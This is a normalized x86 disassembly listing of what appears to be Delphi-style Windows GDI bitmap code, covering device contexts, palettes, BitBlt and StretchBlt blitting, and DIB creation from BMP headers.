push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41dec8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42017b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_41f900
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_4201d4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f030
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_41f72c
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_42023c
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_42094c
mov eax [ esi + 0x28 ]
call sub_41f730
mov eax [ esi + 0x2c ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e30
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_420278
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420330
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b04
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420bbc
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_41f72c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_41f730
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413e5c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_420368
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42094c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4203f7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_41ff64
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_41f900
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420bbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4203fc
mov eax [ ebp - 0x8 ]
call sub_41bdc8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_40388c
call sub_4038e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_420428
push ebx
mov ebx eax
mov eax ebx
call sub_42071c
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40cb14
pop ebx
retn
sub_420458
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415928
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_42094c
lea eax [ ebx + 0x2c ]
call sub_40cb14
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_420bbc
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4204cc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41dbb0
mov eax ebx
call sub_420a5c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_420858
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_420708
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41dadc
push eax
call SetStretchBltMode
mov eax ebx
call sub_42079c
mov dl [ r-xdata ]
call sub_41dbb0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_4209fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_42079c
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42070f
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42069d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41dec8
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_42079c
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e06c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_42071c
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_42095c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_420368
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41de20
sub_42079c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_42095c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f538
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_420428
sub_4207e4
push ebx
mov ebx eax
mov eax ebx
call sub_42094c
mov eax ebx
call sub_42095c
mov edx ebx
mov eax ebx
call sub_420428
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_420808
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_420888
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41c698
mov eax ebx
call sub_420858
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_42079c
xor edx edx
pop ecx
call sub_41da68
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4208d8
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_420a5c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41f900
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_42095c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_4158c4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4209df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_4209fc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_42094c
mov eax ebx
call sub_42095c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_420888
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_41ffc8
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_41f4bc
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_420a5c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41e5b8
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_41f4bc
push 0x0
call GetDC
call sub_41dec8
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_420b14
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41dd9c
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_420368
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_42094c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b04
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_420b98
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_4158a4
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_42124c
pop esi
pop ebx
retn
sub_420bbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420c43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4032a0
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_420ca3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_41f730
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_41f72c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420caa
push rw-data
call LeaveCriticalSection
retn
sub_420cbc
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_42124c
pop edx
pop edi
pop esi
pop ebx
retn
sub_420ce4
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026cc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_421201
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4211d4
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b04
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_41ddb4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_415b40
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b04
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_415ad0
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_41e038
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e058
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_415ad0
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_41dec8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42114f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_41e300
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026cc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4210b7
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_415ad0
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_41dec8
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42108b
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e5b8
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40c5b8
call sub_41ddb4
jmp r-xdata
